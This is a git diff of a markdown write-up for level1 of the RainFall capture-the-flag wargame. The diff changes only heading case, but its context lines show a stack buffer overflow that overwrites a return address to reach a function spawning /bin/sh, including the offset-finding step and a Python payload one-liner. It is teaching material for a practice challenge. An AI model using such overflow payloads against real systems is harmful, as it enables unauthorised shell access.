@@ -1,6 +1,6 @@
-# Level1
+# level1
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level1@RainFall:~$ ./level1
 
@@ -72,7 +72,7 @@ End of assembler dump.
 ```
 Call to <code>system()</code> supports this theory. We can use the common buffer overflow exploit to access the <code>run()</code> function and trigger the <code>/bin/sh</code> of level2.
 
-## Buffer overrun attack
+## buffer overrun attack
 To find the offset, we can use an online tool ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)).
 ``` shell
 level1@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa...Ag2Ag3Ag4Ag5Ag" > /tmp/pattern
@@ -94,7 +94,7 @@ When using Python, we can achieve the same result by reversing the order of the 
 \x08\x04\x84\x44[::-1]
 ```
 
-## Exploit
+## exploit
 ``` shell
 level1@RainFall:~$ python -c 'print "F" * 76 + "\x08\x04\x84\x44"[::-1]' > /tmp/flag1
 level1@RainFall:~$ cat /tmp/flag1 - | ./level1
